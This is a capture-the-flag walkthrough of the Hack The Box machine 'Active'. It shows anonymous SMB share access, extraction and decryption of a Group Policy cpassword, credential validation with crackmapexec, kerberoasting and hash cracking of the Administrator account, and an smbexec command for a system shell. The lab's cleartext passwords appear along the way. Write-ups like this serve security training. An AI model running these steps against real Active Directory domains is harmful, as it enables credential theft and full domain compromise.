[Active](https://www.hackthebox.eu/home/machines/profile/148) is an easy rated windows machine on hackthebox by [eks](https://www.hackthebox.eu/home/users/profile/302) and [mrb3n](https://www.hackthebox.eu/home/users/profile/2984). Groups.xml was found on a smb mount containing the encrypted credentials for a account of which the decrypting keys were public. So, the cipher was decrypted and the password was valid for the account. Administrator account was kerberoastable whose hash was cracked to get root on the machine.

```

- We can see a lot of ports open. 
- Since, dns(53), kerberos(88) and ldap(389) is open, we can assume that the machine might be a active directory domain controller.
- We also get a domain name :  **active.htb**, which we will add to our hosts file. 

# Checking SMB on Port 445

```
- It is enabled and we can see the shares.
- Among all of the shares, Replication is not a default one. So let us check if we have a read permission on that share.

## Checking if Replication share is readable
```console
reddevil@ubuntu:~/Documents/htb/retired/active$ smbclient -N //active.htb/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
We get a smb shell.

## Listing the contents of Replication share
```console
smb: \> dir
  .                                   D        0  Sat Jul 21 16:22:44 2018

  ..                                  D        0  Sat Jul 21 16:22:44 2018

                10459647 blocks of size 4096. 5727630 blocks available
smb: \active.htb\> 
```

## Listing the file contents recursively
```console
smb: \active.htb\> recurse ON 
smb: \active.htb\> dir 
```
First I turn on the recurse option, and if i do `dir`, it will list all the files and folder recursively.
![image](/assets/images/htb-boxes/active/Pasted image 20210704100806.png)
Among all of the files, Groups.xml looks interesting.

Reading [this](https://adsecurity.org/?p=2288) article, I found that this file contains the password for the local users which is used to replicate across the different devices on the domain and is encrypted using AES. Also the key for decryption was made public by the microsoft which means we can easily decrypt the hash and get the password.

## Downloading and reading the content
```console
smb: \> get \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```
```console
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
- We get a username and  a hash.
- `SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

## Decrypting the hash
To decrypt we need encryption key and an IV.
![image](/assets/images/htb-boxes/active/Pasted image 20210704111207.png)
From [this](https://github.com/t0thkr1s/gpp-decrypt/blob/master/gpp-decrypt.py) repo, I got the key, IV and the mode of AES encryption.

## Using cyberchef to decrypt the hash
![image](/assets/images/htb-boxes/active/Pasted image 20210704111416.png)
We get the password for the svc_tgs.


## Checking if the creds are valid
```console
reddevil@ubuntu:~/Documents/htb/retired/active$ cme smb active.htb -u user -p pass 
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
```
We have valid creds.

## Listing the shares
![image](/assets/images/htb-boxes/active/Pasted image 20210704113257.png)
Doesnot look like we can do much with it. We can read few default shares and the Replication share.

## Checking if there are any kerberoastable users
-   Those accounts which have their Service Principal Name(SPN) set are kerberoastable. Usually these accounts are service accounts.
-   For kerberoastable account, we can request a TGS and some portion of data inside this TGS is encrypted with the NTLM hash of the service account which we can try and crack offline.
-   To request for TGS, we must have a valid account on the domain.

Since we have a valid account on the domain, we can request for the TGS, if there are any accounts associated with the services.

![image](/assets/images/htb-boxes/active/Pasted image 20210704115550.png)
We do have a account and we get the hash back.

## Trying to crack the hash using hashcat
![image](/assets/images/htb-boxes/active/Pasted image 20210704115953.png)
And we can see that the hash cracks successfully.


## Testing the account with cme
```console
reddevil@ubuntu:~/Documents/htb/retired/active$ cme smb active.htb -u administrator -p Ticketmaster1968
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```
- It says pwned so it means that we can get a shell.
- we can use wmiexec or smbexec to get a shell.
- The difference is that we get a shell as `administrator` with smbexec whereas `nt authority\system` as wmiexec.

## Getting a shell as system

```console
reddevil@ubuntu:~/Documents/htb/retired/active$ smbexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
